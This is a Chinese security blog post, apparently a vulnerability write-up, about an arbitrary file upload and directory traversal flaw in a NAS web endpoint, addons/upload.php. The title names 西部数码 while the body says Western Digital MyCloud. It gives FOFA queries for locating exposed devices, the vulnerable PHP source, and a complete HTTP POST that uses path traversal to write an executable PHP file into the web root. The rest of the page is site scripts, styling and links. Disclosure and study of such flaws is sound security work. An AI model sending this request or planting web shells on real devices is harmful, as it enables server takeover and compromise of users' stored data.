---
title: "西部数码 NAS addons/upload.php 任意文件上传漏洞"
source: https://mrxn.net/jswz/west-nas-addons-upload-rce.html
asset_dir: assets/西部数码-nas-addonsupload.php-任意文件上传漏洞
---

# 西部数码 NAS addons/upload.php 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/13 12:17
* 669浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

SQL注入检测工具

文件大小转换

在线安全工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS addons/upload.php中存在[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者可通过该漏洞在服务器端任意[执行代码](https://mrxn.net/tag/rce)，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

网络安全培训

授权

安全

直接看 `/addons/upload.php` 其业务实现逻辑如下

```
<?php
//if(!isset($_REQUEST['name'])) throw new Exception('Name required');
//if(!preg_match('/^[-a-z0-9_][-a-z0-9_.]*$/i', $_REQUEST['name'])) throw new Exception('Name error');
//
//if(!isset($_REQUEST['index'])) throw new Exception('Index required');
//if(!preg_match('/^[0-9]+$/', $_REQUEST['index'])) throw new Exception('Index error');
//
//if(!isset($_FILES['file'])) throw new Exception('Upload required');
//if($_FILES['file']['error'] != 0) throw new Exception('Upload error');

$path = str_replace('//','/',$_REQUEST['folder']);
$filename = str_replace('\\','',$_REQUEST['name']);
$target =  $path . $filename . '-' . $_REQUEST['index'];

//$target =  $_REQUEST['folder'] . $_REQUEST['name'] . '-' . $_REQUEST['index'];

move_uploaded_file($_FILES['file']['tmp_name'], $target);

//$handle = fopen("/tmp/debug.txt", "w+");
//fwrite($handle, $_FILES['file']['tmp_name']); 
//fwrite($handle, "\n"); 
//fwrite($handle, $target); 
//fclose($handle); 

// Might execute too quickly.
sleep(1);

?>
```

深入探索

漏洞扫描服务

网页浏览器

防火墙软件

三个参数均未过滤或校验直接参与文件上传保存文件路径操作，形成**目录遍历+任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞**，允许攻击者可控文件路径及内容。

# 漏洞复现

```
POST /web/addons/upload.php HTTP/1.1
Host: west.nas.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="folder"

/../../../../../../../../var/www/
------WebKitFormBoundary
Content-Disposition: form-data; name="name"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="index"

2.php
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary--
```

访问上传文件 `1-2.php`

[![西部数码 NAS addons/upload.php 任意文件上传漏洞](images/img-001-e29bdd8ad6ce.webp)](https://image.mrxn.net/d8bc444aecbb4fd58b1d140c48ec3240.webp)

成功[执行](https://mrxn.net/tag/rce)上传文件里的代码

漏洞预警服务

* 标签：
* [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS addons/upload.php 任意文件上传漏洞](https://mrxn.net/jswz/west-nas-addons-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-addons-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-addons-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全运维咨询

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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